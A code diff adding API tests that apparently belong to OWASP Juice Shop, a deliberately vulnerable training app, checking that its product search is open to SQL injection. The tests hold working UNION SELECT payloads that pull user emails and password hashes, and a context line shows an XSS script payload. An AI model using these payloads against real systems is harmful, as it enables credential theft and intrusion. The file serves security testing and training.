@@ -157,3 +157,61 @@ frisby.create('POST new product does not filter XSS attacks')
         description: "<script>alert(\'XSS4\')</script>"
     }).toss();
 
+frisby.create('GET product search fails with error message that exposes ins SQL Injection vulnerability')
+    .get(REST_URL + '/product/search?q=\';')
+    .expectStatus(500)
+    .expectHeaderContains('content-type', 'text/html')
+    .expectBodyContains('<h1>Juice Shop (Express ~')
+    .expectBodyContains('SQLITE_ERROR: near &quot;;&quot;: syntax error')
+    .toss();
+
+frisby.create('GET product search SQL Injection fails from missing closing parenthesis')
+    .get(REST_URL + '/product/search?q=\' union select null,id,email,password,null,null,null from users--')
+    .expectStatus(500)
+    .expectHeaderContains('content-type', 'text/html')
+    .expectBodyContains('<h1>Juice Shop (Express ~')
+    .expectBodyContains('SQLITE_ERROR: near &quot;union&quot;: syntax error')
+    .toss();
+
+frisby.create('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns')
+    .get(REST_URL + '/product/search?q=\') union select * from users--')
+    .expectStatus(500)
+    .expectHeaderContains('content-type', 'text/html')
+    .expectBodyContains('<h1>Juice Shop (Express ~')
+    .expectBodyContains('SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns')
+    .toss();
+
+frisby.create('GET product search can create UNION SELECT with Users table and fixed columns')
+    .get(REST_URL + '/product/search?q=\') union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\' from users--')
+    .expectStatus(200)
+    .expectHeaderContains('content-type', 'application/json')
+    .expectJSON('data.?', {
+        id: '1',
+        name: '2',
+        description: '3',
+        price: '4',
+        image: '5',
+        createdAt: '6',
+        updatedAt: '7'
+    }).toss();
+
+frisby.create('GET product search can create UNION SELECT with Users table and required columns')
+    .get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
+    .expectStatus(200)
+    .expectHeaderContains('content-type', 'application/json')
+    .expectJSON('data.?', {
+        name: 1,
+        description: 'admin@juice-sh.op',
+        price: insecurity.hash('admin123')
+    })
+    .expectJSON('data.?', {
+        name: 2,
+        description: 'jim@juice-sh.op',
+        price: insecurity.hash('ncc-1701')
+    })
+    .expectJSON('data.?', {
+        name: 3,
+        description: 'bender@juice-sh.op',
+        price: insecurity.hash('booze')
+    })
+    .toss();
